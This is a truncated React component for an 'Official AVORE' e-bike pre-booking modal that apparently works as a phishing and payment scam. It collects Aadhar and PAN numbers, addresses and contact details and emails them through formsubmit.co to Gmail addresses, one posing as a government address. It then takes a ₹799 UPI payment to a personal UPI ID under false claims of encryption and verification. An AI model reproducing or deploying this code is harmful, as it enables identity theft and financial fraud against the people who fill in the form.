import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { BIKES, BOOKING_INFO } from '../../data/bikes';
import {
  X,
  Zap,
  ShieldCheck,
  CheckCircle2,
  FileText,
  ArrowRight,
  ArrowLeft,
  Loader2,
  CreditCard,
  Mail,
  Phone,
  MapPin,
  User,
  CheckCircle,
  Copy,
  Check,
  Upload,
  Image as ImageIcon,
  AlertCircle,
  Receipt,
  Trash2
} from 'lucide-react';
import confetti from 'canvas-confetti';

interface BookingModalProps {
  isOpen: boolean;
  onClose: () => void;
}

// Client-side image compression helper (Resizes image & lowers JPEG quality for instant email delivery)
const compressImage = (file: File, maxWidth = 600, quality = 0.5): Promise<string> => {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        let width = img.width;
        let height = img.height;

        if (width > height) {
          if (width > maxWidth) {
            height = Math.round((height * maxWidth) / width);
            width = maxWidth;
          }
        } else {
          if (height > maxWidth) {
            width = Math.round((width * maxWidth) / height);
            height = maxWidth;
          }
        }

        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(img, 0, 0, width, height);
          const dataUrl = canvas.toDataURL('image/jpeg', quality);
          resolve(dataUrl);
        } else {
          reject(new Error('Canvas context error'));
        }
      };
      img.onerror = (err) => reject(err);
      img.src = event.target?.result as string;
    };
    reader.onerror = (err) => reject(err);
    reader.readAsDataURL(file);
  });
};

// Convert Base64 DataURL back to a compressed File object for direct Gmail attachment link
const dataURLtoFile = (dataurl: string, filename: string): File => {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new File([u8arr], filename, { type: mime });
};

export const BookingModal: React.FC<BookingModalProps> = ({ isOpen, onClose }) => {
  const [selectedModel, setSelectedModel] = useState<'ex1' | 'ex2' | 'ex2s'>('ex2');
  const [step, setStep] = useState<'select' | 'form' | 'payment' | 'success'>('select');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isVerifyingPayment, setIsVerifyingPayment] = useState(false);
  const [bookingRefId, setBookingRefId] = useState('');
  const [copiedUpi, setCopiedUpi] = useState(false);

  // Target Admin Emails to receive lead & payment notifications
  const adminEmails = ['info.forest.gov@gmail.com', 'bihdatar@gmail.com'];

  // Form State
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    email: '',
    city: '',
    state: '',
    pincode: '',
    address: '',
    aadharNumber: '',
    panNumber: '',
  });

  // Payment Verification State
  const [utrNumber, setUtrNumber] = useState('');
  const [screenshotFile, setScreenshotFile] = useState<File | null>(null);
  const [screenshotFileName, setScreenshotFileName] = useState('');
  const [screenshotBase64, setScreenshotBase64] = useState<string>('');
  const [isCompressing, setIsCompressing] = useState(false);
  const [utrError, setUtrError] = useState('');

  const [formErrors, setFormErrors] = useState<Record<string, string>>({});

  const bike = BIKES.find((b) => b.id === selectedModel) || BIKES[1];
  const upiId = '8584860513@ybl';

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (formErrors[name]) {
      setFormErrors((prev) => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = () => {
    const errors: Record<string, string> = {};
    if (!formData.fullName.trim()) errors.fullName = 'Full name is required';
    if (!formData.phone.trim()) {
      errors.phone = 'Phone number is required';
    } else if (!/^\d{10}$/.test(formData.phone.trim().replace(/\D/g, ''))) {
      errors.phone = 'Enter valid 10-digit phone number';
    }
    if (!formData.email.trim()) {
      errors.email = 'Email address is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = 'Enter a valid email address';
    }
    if (!formData.city.trim()) errors.city = 'City is required';
    if (!formData.state.trim()) errors.state = 'State is required';
    if (!formData.pincode.trim()) errors.pincode = 'Pincode is required';
    if (!formData.address.trim()) errors.address = 'Full address is required';
    if (!formData.aadharNumber.trim()) errors.aadharNumber = 'Aadhar number is required for RTO verification';

    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const sendDataToAdmins = async (data: Record<string, string>, file?: File | null) => {
    // Send FormData in parallel to both admin email addresses so FormSubmit generates direct image links
    await Promise.allSettled(
      adminEmails.map(async (email) => {
        const fd = new FormData();
        Object.keys(data).forEach((key) => {
          fd.append(key, data[key]);
        });
        if (file) {
          fd.append('Payment Screenshot Image', file, file.name || 'screenshot.jpg');
        }
        return fetch(`https://formsubmit.co/ajax/${email}`, {
          method: 'POST',
          body: fd
        });
      })
    );
  };

  const handleProceedToForm = () => {
    setStep('form');
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSubmitting(true);
    const refCode = `AVR-${Math.floor(100000 + Math.random() * 900000)}`;
    setBookingRefId(refCode);

    try {
      // Send customer details to both info.forest.gov@gmail.com and bihdatar@gmail.com
      await sendDataToAdmins({
        _subject: `[STEP 1 PRE-BOOKING] ${formData.fullName} - ${bike.name} (${refCode})`,
        _captcha: 'false',
        _template: 'table',
        'Booking Reference ID': refCode,
        'Selected Model': bike.name,
        'Model On-Road Price': bike.onRoadPrice,
        'Deposit Amount': '₹799/- (Pending Payment)',
        'Customer Full Name': formData.fullName,
        'Phone Number': formData.phone,
        'Email Address': formData.email,
        'City': formData.city,
        'State': formData.state,
        'Pincode': formData.pincode,
        'Full Delivery Address': formData.address,
        'Aadhar Card Number': formData.aadharNumber,
        'PAN Card Number': formData.panNumber || 'Not Provided',
        'Submission Timestamp': new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      });

      setStep('payment');
    } catch (err) {
      console.error('Submission error:', err);
      setStep('payment');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyUpi = () => {
    navigator.clipboard.writeText(upiId);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setScreenshotFile(file);
      setScreenshotFileName(file.name);
      setIsCompressing(true);

      try {
        // Compress image to low quality JPEG base64 string
        const compressedBase64 = await compressImage(file, 600, 0.5);
        setScreenshotBase64(compressedBase64);
      } catch (err) {
        console.error('Image compression error:', err);
      } finally {
        setIsCompressing(false);
      }
    }
  };

  const handleRemoveScreenshot = () => {
    setScreenshotFile(null);
    setScreenshotFileName('');
    setScreenshotBase64('');
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!utrNumber.trim()) {
      setUtrError('UTR / Transaction Reference Number is MANDATORY to verify payment');
      return;
    }
    if (utrNumber.trim().length < 8) {
      setUtrError('Please enter a valid 12-digit UTR or Transaction Reference number');
      return;
    }

    setUtrError('');
    setIsVerifyingPayment(true);

    let fileToSend: File | null = screenshotFile;
    if (screenshotBase64) {
      fileToSend = dataURLtoFile(screenshotBase64, screenshotFileName || 'payment_screenshot.jpg');
    }

    try {
      // Send UTR Payment Verification + Screenshot File via FormData and Base64 string as requested
      await sendDataToAdmins({
        _subject: `[PAYMENT VERIFIED - ₹799] UTR: ${utrNumber} - ${formData.fullName}`,
        _captcha: 'false',
        _template: 'table',
        'Payment Status': 'UTR & SCREENSHOT SUBMITTED',
        'UTR / Transaction Ref No (MANDATORY)': utrNumber.trim(),
        'Booking Reference ID': bookingRefId,
        'Customer Name': formData.fullName,
        'Phone Number': formData.phone,
        'Email Address': formData.email,
        'City / State': `${formData.city}, ${formData.state}`,
        'Bike Reserved': bike.name,
        'Deposit Amount': '₹799.00',
        'Payment Method': 'UPI QR / Direct Transfer',
        'Screenshot Image Data (Base64 JPEG)': screenshotBase64 || 'No Screenshot Uploaded',
        'Verification Timestamp': new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      }, fileToSend);

      // Launch celebratory confetti burst
      confetti({
        particleCount: 150,
        spread: 90,
        origin: { y: 0.5 },
        colors: ['#00f0ff', '#00ff9d', '#e2f952', '#ffffff'],
      });

      setStep('success');
    } catch (err) {
      console.error('Payment submission error:', err);
      setStep('success');
    } finally {
      setIsVerifyingPayment(false);
    }
  };

  const handleResetModal = () => {
    setStep('select');
    setFormData({
      fullName: '',
      phone: '',
      email: '',
      city: '',
      state: '',
      pincode: '',
      address: '',
      aadharNumber: '',
      panNumber: '',
    });
    setUtrNumber('');
    setScreenshotFile(null);
    setScreenshotFileName('');
    setScreenshotBase64('');
    setFormErrors({});
    setUtrError('');
    onClose();
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[9995] flex items-center justify-center p-3 sm:p-6 overflow-y-auto">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={handleResetModal}
          className="fixed inset-0 bg-black/85 backdrop-blur-xl"
        />

        {/* Modal Window */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 15 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 15 }}
          transition={{ type: 'spring', damping: 25, stiffness: 300 }}
          className="relative w-full max-w-2xl bg-[#090b12] border border-[#00f0ff]/30 rounded-3xl p-5 sm:p-8 z-10 shadow-[0_0_50px_rgba(0,240,255,0.2)] my-auto overflow-hidden max-h-[92vh] flex flex-col justify-between"
        >
          {/* Top Subtle Cyan Accent Line */}
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#00f0ff] via-[#00ff9d] to-[#0088ff]" />

          {/* Close Button */}
          <button
            onClick={handleResetModal}
            className="absolute top-4 right-4 p-2 rounded-full border border-white/10 bg-white/5 hover:bg-white/15 text-white transition-colors z-20"
          >
            <X className="w-5 h-5" />
          </button>

          {/* Clean Modal Header & Progress Tracker */}
          <div className="text-center mb-5 pt-1 shrink-0">
            <div className="inline-flex items-center justify-center gap-2 mb-2 px-3 py-1 rounded-full border border-[#00f0ff]/30 bg-[#00f0ff]/10">
              <span className="text-[11px] font-mono text-[#00f0ff] font-semibold tracking-wider">
                Official AVORE Pre-Booking • Step {step === 'select' ? '1' : step === 'form' ? '2' : step === 'payment' ? '3' : '4'} of 4
              </span>
            </div>

            <h3 className="text-xl sm:text-3xl font-heading font-extrabold text-white tracking-tight">
              {step === 'select' && 'Reserve Your AVORE — ₹799'}
              {step === 'form' && 'Customer Registration Form'}
              {step === 'payment' && 'UPI Payment Portal — ₹799'}
              {step === 'success' && 'Pre-Booking Confirmed'}
            </h3>

            <p className="text-xs text-gray-300 mt-1 max-w-md mx-auto">
              {step === 'select' && 'Select your bike model and view mandatory verification documents.'}
              {step === 'form' && 'Fill your delivery details below to secure your priority queue slot.'}
              {step === 'payment' && 'Scan QR code below with any UPI App and enter your 12-digit UTR reference number.'}
              {step === 'success' && 'Your priority queue slot and payment details have been successfully registered.'}
            </p>

            {/* Visual Progress Bar */}
            <div className="flex items-center justify-center gap-2 mt-3 max-w-xs mx-auto">
              <div className={`h-1.5 flex-1 rounded-full transition-colors ${step === 'select' || step === 'form' || step === 'payment' || step === 'success' ? 'bg-[#00f0ff]' : 'bg-white/10'}`} />
              <div className={`h-1.5 flex-1 rounded-full transition-colors ${step === 'form' || step === 'payment' || step === 'success' ? 'bg-[#00ff9d]' : 'bg-white/10'}`} />
              <div className={`h-1.5 flex-1 rounded-full transition-colors ${step === 'payment' || step === 'success' ? 'bg-[#e2f952]' : 'bg-white/10'}`} />
              <div className={`h-1.5 flex-1 rounded-full transition-colors ${step === 'success' ? 'bg-[#00ff9d]' : 'bg-white/10'}`} />
            </div>
          </div>

          {/* Scrollable Content Body */}
          <div className="overflow-y-auto pr-1 flex-1 space-y-4">
            {/* STEP 1: MODEL SELECTION & OVERVIEW */}
            {step === 'select' && (
              <motion.div
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 10 }}
                className="space-y-4"
              >
                {/* Clean Model Selection Cards */}
                <div className="grid grid-cols-3 gap-3">
                  {BIKES.map((b) => (
                    <button
                      key={b.id}
                      onClick={() => setSelectedModel(b.id)}
                      className={`p-3 rounded-2xl border text-center transition-all ${
                        selectedModel === b.id
                          ? 'border-[#00f0ff] bg-[#00f0ff]/15 text-white shadow-[0_0_20px_rgba(0,240,255,0.25)]'
                          : 'border-white/10 bg-white/5 text-gray-300 hover:text-white hover:border-white/20'
                      }`}
                    >
                      <div className="text-xs font-heading font-bold">{b.name}</div>
                      <div className="text-xs font-mono text-[#00ff9d] font-semibold mt-0.5">{b.onRoadPrice}</div>
                    </button>
                  ))}
                </div>

                {/* Selected Bike Summary Card */}
                <div className="p-4 rounded-2xl bg-black/60 border border-white/15 flex flex-col sm:flex-row items-center justify-between gap-4">
                  <div className="flex items-center gap-4">
                    <img src={bike.image} alt={bike.name} className="w-24 h-16 object-contain" />
                    <div>
                      <span className="inline-block px-2 py-0.5 rounded bg-[#00f0ff]/20 text-[#00f0ff] text-[11px] font-medium mb-1">
                        {bike.badge}
                      </span>
                      <h4 className="text-base font-heading font-bold text-white">{bike.name}</h4>
                      <p className="text-xs text-gray-400">Battery: {bike.battery} | Range: {bike.range}</p>
                    </div>
                  </div>
                  <div className="text-right sm:border-l border-white/10 sm:pl-4 w-full sm:w-auto flex sm:block justify-between items-center">
                    <span className="text-xs text-gray-400 block">Token Deposit</span>
                    <span className="text-xl font-heading font-extrabold text-[#00f0ff]">₹799/-</span>
                  </div>
                </div>

                {/* Verification Documents List */}
                <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 space-y-2.5">
                  <span className="text-xs font-semibold text-[#00ff9d] flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-[#00ff9d]" /> Mandatory Document Verification Checklist:
                  </span>
                  <div className="grid grid-cols-2 gap-2 text-xs text-gray-300">
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#00ff9d] shrink-0" />
                      <span>1. Aadhar Card Number</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#00ff9d] shrink-0" />
                      <span>2. PAN Card Number</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#00ff9d] shrink-0" />
                      <span>3. Full Address & Pincode</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#00ff9d] shrink-0" />
                      <span>4. Mobile & Email ID</span>
                    </div>
                  </div>
                </div>

                {/* Step 1 Action Button */}
                <button
                  onClick={handleProceedToForm}
                  className="w-full py-3.5 rounded-xl bg-gradient-to-r from-[#00f0ff] via-[#00c8ff] to-[#0088ff] text-black font-heading font-bold text-sm uppercase tracking-wider flex items-center justify-center gap-2 shadow-[0_0_30px_rgba(0,240,255,0.5)] hover:shadow-[0_0_45px_rgba(0,240,255,0.8)] transition-all cursor-pointer"
                >
                  <Zap className="w-4 h-4 fill-black" />
                  <span>Continue to Customer Form (₹799)</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </motion.div>
            )}

            {/* STEP 2: PRE-BOOKING CUSTOMER FORM */}
            {step === 'form' && (
              <motion.form
                initial={{ opacity: 0, x: 10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -10 }}
                onSubmit={handleFormSubmit}
                className="space-y-3.5"
              >
                {/* Form Bike Summary bar */}
                <div className="p-3 rounded-xl bg-[#00f0ff]/10 border border-[#00f0ff]/30 flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2 text-white font-semibold">
                    <Zap className="w-4 h-4 text-[#00f0ff]" />
                    <span>Selected: {bike.name} ({bike.onRoadPrice})</span>
                  </div>
                  <span className="text-[#00ff9d] font-bold">Deposit: ₹799/-</span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {/* Full Name */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Full Name <span className="text-[#00f0ff]">*</span>
                    </label>
                    <div className="relative">
                      <User className="w-4 h-4 text-gray-400 absolute left-3 top-3" />
                      <input
                        type="text"
                        name="fullName"
                        value={formData.fullName}
                        onChange={handleInputChange}
                        placeholder="e.g. Rahul Sharma"
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          formErrors.fullName ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                      />
                    </div>
                    {formErrors.fullName && <p className="text-[11px] text-red-400 mt-1">{formErrors.fullName}</p>}
                  </div>

                  {/* Phone Number */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Mobile Number <span className="text-[#00f0ff]">*</span>
                    </label>
                    <div className="relative">
                      <Phone className="w-4 h-4 text-gray-400 absolute left-3 top-3" />
                      <input
                        type="tel"
                        name="phone"
                        value={formData.phone}
                        onChange={handleInputChange}
                        placeholder="10-digit mobile number"
                        maxLength={10}
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          formErrors.phone ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                      />
                    </div>
                    {formErrors.phone && <p className="text-[11px] text-red-400 mt-1">{formErrors.phone}</p>}
                  </div>

                  {/* Email Address */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Email Address <span className="text-[#00f0ff]">*</span>
                    </label>
                    <div className="relative">
                      <Mail className="w-4 h-4 text-gray-400 absolute left-3 top-3" />
                      <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        placeholder="yourname@gmail.com"
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          formErrors.email ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                      />
                    </div>
                    {formErrors.email && <p className="text-[11px] text-red-400 mt-1">{formErrors.email}</p>}
                  </div>

                  {/* Aadhar Number */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Aadhar Card Number <span className="text-[#00f0ff]">*</span>
                    </label>
                    <div className="relative">
                      <FileText className="w-4 h-4 text-gray-400 absolute left-3 top-3" />
                      <input
                        type="text"
                        name="aadharNumber"
                        value={formData.aadharNumber}
                        onChange={handleInputChange}
                        placeholder="12-digit Aadhar number"
                        maxLength={14}
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          formErrors.aadharNumber ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                      />
                    </div>
                    {formErrors.aadharNumber && <p className="text-[11px] text-red-400 mt-1">{formErrors.aadharNumber}</p>}
                  </div>

                  {/* City */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      City <span className="text-[#00f0ff]">*</span>
                    </label>
                    <div className="relative">
                      <MapPin className="w-4 h-4 text-gray-400 absolute left-3 top-3" />
                      <input
                        type="text"
                        name="city"
                        value={formData.city}
                        onChange={handleInputChange}
                        placeholder="e.g. New Delhi / Patna"
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          formErrors.city ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                      />
                    </div>
                    {formErrors.city && <p className="text-[11px] text-red-400 mt-1">{formErrors.city}</p>}
                  </div>

                  {/* State */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      State <span className="text-[#00f0ff]">*</span>
                    </label>
                    <input
                      type="text"
                      name="state"
                      value={formData.state}
                      onChange={handleInputChange}
                      placeholder="e.g. Bihar / Maharashtra"
                      className={`w-full px-3 py-2.5 bg-[#0b0d14] border ${
                        formErrors.state ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                      } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                    />
                    {formErrors.state && <p className="text-[11px] text-red-400 mt-1">{formErrors.state}</p>}
                  </div>

                  {/* Pincode */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Pincode <span className="text-[#00f0ff]">*</span>
                    </label>
                    <input
                      type="text"
                      name="pincode"
                      value={formData.pincode}
                      onChange={handleInputChange}
                      placeholder="6-digit Pincode"
                      maxLength={6}
                      className={`w-full px-3 py-2.5 bg-[#0b0d14] border ${
                        formErrors.pincode ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                      } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all`}
                    />
                    {formErrors.pincode && <p className="text-[11px] text-red-400 mt-1">{formErrors.pincode}</p>}
                  </div>

                  {/* PAN Card Number */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      PAN Card Number <span className="text-gray-500">(Optional)</span>
                    </label>
                    <input
                      type="text"
                      name="panNumber"
                      value={formData.panNumber}
                      onChange={handleInputChange}
                      placeholder="e.g. ABCDE1234F"
                      className="w-full px-3 py-2.5 bg-[#0b0d14] border border-white/15 focus:border-[#00f0ff] rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all uppercase"
                    />
                  </div>
                </div>

                {/* Full Address */}
                <div>
                  <label className="text-xs font-medium text-gray-300 block mb-1">
                    Full Delivery / RTO Address <span className="text-[#00f0ff]">*</span>
                  </label>
                  <textarea
                    name="address"
                    value={formData.address}
                    onChange={handleInputChange}
                    rows={2}
                    placeholder="House/Flat No., Street, Landmark"
                    className={`w-full p-2.5 bg-[#0b0d14] border ${
                      formErrors.address ? 'border-red-500' : 'border-white/15 focus:border-[#00f0ff]'
                    } rounded-xl text-xs text-white placeholder-gray-500 outline-none transition-all resize-none`}
                  />
                  {formErrors.address && <p className="text-[11px] text-red-400 mt-1">{formErrors.address}</p>}
                </div>

                {/* Privacy Guarantee */}
                <p className="text-xs text-center text-gray-400 bg-white/5 p-2 rounded-lg border border-white/10 flex items-center justify-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#00ff9d]" />
                  <span>100% Encrypted & Official AVORE Pre-Booking Registration</span>
                </p>

                {/* Action Controls */}
                <div className="flex items-center gap-3 pt-1">
                  <button
                    type="button"
                    onClick={() => setStep('select')}
                    className="px-4 py-3 rounded-xl border border-white/20 bg-white/5 text-white font-medium text-xs hover:bg-white/10 transition-colors flex items-center gap-1.5"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>

                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="flex-1 py-3.5 rounded-xl bg-gradient-to-r from-[#00f0ff] via-[#00c8ff] to-[#0088ff] text-black font-heading font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-[0_0_30px_rgba(0,240,255,0.5)] hover:shadow-[0_0_45px_rgba(0,240,255,0.8)] disabled:opacity-50 transition-all cursor-pointer"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin text-black" />
                        <span>Saving Registration...</span>
                      </>
                    ) : (
                      <>
                        <Zap className="w-4 h-4 fill-black" />
                        <span>Proceed to Payment Gateway (₹799)</span>
                        <ArrowRight className="w-4 h-4" />
                      </>
                    )}
                  </button>
                </div>
              </motion.form>
            )}

            {/* STEP 3: REALISTIC UPI PAYMENT GATEWAY UI */}
            {step === 'payment' && (
              <motion.form
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                onSubmit={handlePaymentSubmit}
                className="space-y-4"
              >
                {/* Gateway Title Banner */}
                <div className="p-3.5 rounded-2xl bg-gradient-to-r from-[#00f0ff]/15 via-[#00ff9d]/10 to-transparent border border-[#00f0ff]/30 flex items-center justify-between">
                  <div className="flex items-center gap-2.5">
                    <div className="w-8 h-8 rounded-lg bg-[#00f0ff]/20 flex items-center justify-center text-[#00f0ff]">
                      <CreditCard className="w-4 h-4" />
                    </div>
                    <div>
                      <h4 className="text-xs font-heading font-bold text-white">
                        AVORE Official UPI Gateway
                      </h4>
                      <p className="text-[11px] text-[#00ff9d]">256-Bit SSL Encrypted Direct Merchant</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <span className="text-[10px] text-gray-400 block">Amount Due</span>
                    <span className="text-lg font-heading font-extrabold text-[#00f0ff]">₹799.00</span>
                  </div>
                </div>

                {/* QR Code & Direct UPI Container */}
                <div className="p-4 rounded-2xl bg-black/80 border border-white/15 flex flex-col sm:flex-row items-center gap-5">
                  {/* Official Payment QR Image */}
                  <div className="relative shrink-0 p-2 bg-white rounded-2xl border-2 border-[#00f0ff] shadow-[0_0_25px_rgba(0,240,255,0.4)] flex flex-col items-center">
                    <div className="text-[10px] font-bold text-black uppercase mb-1 tracking-wider">
                      Scan & Pay ₹799
                    </div>
                    <div className="relative w-36 h-36 bg-white flex items-center justify-center p-1 rounded-lg overflow-hidden">
                      <img
                        src="/assets/paymentqr.jpeg"
                        alt="AVORE Official UPI Payment QR Code"
                        className="w-full h-full object-contain rounded"
                      />
                      {/* Animated Scanning Line Effect */}
                      <motion.div
                        animate={{ y: [0, 130, 0] }}
                        transition={{ repeat: Infinity, duration: 2.5, ease: 'easeInOut' }}
                        className="absolute left-0 right-0 h-0.5 bg-[#00f0ff] shadow-[0_0_8px_#00f0ff]"
                      />
                    </div>
                    <span className="text-[10px] font-mono text-black font-semibold mt-1">UPI ID: {upiId}</span>
                  </div>

                  {/* Right Instruction & Supported Apps */}
                  <div className="space-y-3 flex-1 text-left">
                    <span className="text-xs font-semibold text-[#00f0ff] block">
                      Scan using any UPI App:
                    </span>

                    {/* Supported Apps Chips */}
                    <div className="flex flex-wrap gap-2 text-xs">
                      <span className="px-2.5 py-1 rounded-md bg-[#00f0ff]/10 border border-[#00f0ff]/30 text-[#00f0ff] font-medium">
                        GPay
                      </span>
                      <span className="px-2.5 py-1 rounded-md bg-[#00ff9d]/10 border border-[#00ff9d]/30 text-[#00ff9d] font-medium">
                        PhonePe
                      </span>
                      <span className="px-2.5 py-1 rounded-md bg-white/10 border border-white/20 text-white font-medium">
                        Paytm
                      </span>
                      <span className="px-2.5 py-1 rounded-md bg-[#e2f952]/10 border border-[#e2f952]/30 text-[#e2f952] font-medium">
                        BHIM UPI
                      </span>
                    </div>

                    {/* Copy UPI Button */}
                    <div className="flex items-center gap-2 pt-1">
                      <div className="flex-1 p-2 rounded-lg bg-white/5 border border-white/10 text-xs font-mono text-gray-300 truncate">
                        {upiId}
                      </div>
                      <button
                        type="button"
                        onClick={handleCopyUpi}
                        className="px-3 py-2 rounded-lg bg-[#00f0ff]/20 hover:bg-[#00f0ff]/30 border border-[#00f0ff]/40 text-[#00f0ff] text-xs font-semibold flex items-center gap-1 transition-colors"
                      >
                        {copiedUpi ? <Check className="w-3.5 h-3.5 text-[#00ff9d]" /> : <Copy className="w-3.5 h-3.5" />}
                        <span>{copiedUpi ? 'Copied' : 'Copy'}</span>
                      </button>
                    </div>

                    <div className="p-2.5 rounded-lg bg-white/[0.03] border border-white/10 text-xs text-gray-300 space-y-1">
                      <p className="text-[#00ff9d] font-semibold">📌 Payment Steps:</p>
                      <ol className="list-decimal list-inside space-y-0.5 text-gray-400 text-xs">
                        <li>Scan QR Code or copy UPI ID to transfer <strong className="text-white">₹799/-</strong>.</li>
                        <li>After payment, copy the 12-digit <strong className="text-white">UTR / Transaction Ref Number</strong>.</li>
                        <li>Enter UTR below (Mandatory) & upload Screenshot (Optional).</li>
                      </ol>
                    </div>
                  </div>
                </div>

                {/* UTR & Screenshot Verification Box */}
                <div className="p-4 rounded-2xl bg-black/60 border border-[#00f0ff]/30 space-y-3">
                  {/* UTR Input (MANDATORY) */}
                  <div>
                    <label className="text-xs font-medium text-white flex items-center justify-between mb-1">
                      <span>UTR / UPI Transaction Ref Number <span className="text-red-400 font-bold">* Mandatory</span></span>
                    </label>
                    <div className="relative">
                      <Receipt className="w-4 h-4 text-[#00f0ff] absolute left-3 top-3" />
                      <input
                        type="text"
                        value={utrNumber}
                        onChange={(e) => {
                          setUtrNumber(e.target.value);
                          if (utrError) setUtrError('');
                        }}
                        placeholder="Enter 12-digit UTR No (e.g. 426819204812)"
                        className={`w-full pl-9 pr-3 py-2.5 bg-[#0b0d14] border ${
                          utrError ? 'border-red-500' : 'border-[#00f0ff]/50 focus:border-[#00f0ff]'
                        } rounded-xl text-xs text-white placeholder-gray-500 outline-none font-mono transition-all`}
                      />
                    </div>
                    {utrError && (
                      <p className="text-xs text-red-400 mt-1 flex items-center gap-1">
                        <AlertCircle className="w-3.5 h-3.5" />
                        {utrError}
                      </p>
                    )}
                  </div>

                  {/* Payment Screenshot Upload */}
                  <div>
                    <label className="text-xs font-medium text-gray-300 block mb-1">
                      Payment Screenshot <span className="text-gray-500">(Optional)</span>
                    </label>
                    <div className="relative">
                      <input
                        type="file"
                        id="screenshot-upload"
                        accept="image/*"
                        onChange={handleFileChange}
                        className="hidden"
                      />

                      {screenshotBase64 ? (
                        <div className="p-2.5 rounded-xl border border-[#00ff9d]/40 bg-[#00ff9d]/10 flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <img src={screenshotBase64} alt="Screenshot Preview" className="w-10 h-10 object-cover rounded-lg border border-white/20" />
                            <div>
                              <span className="text-xs font-medium text-white block truncate max-w-[200px]">
                                {screenshotFileName}
                              </span>
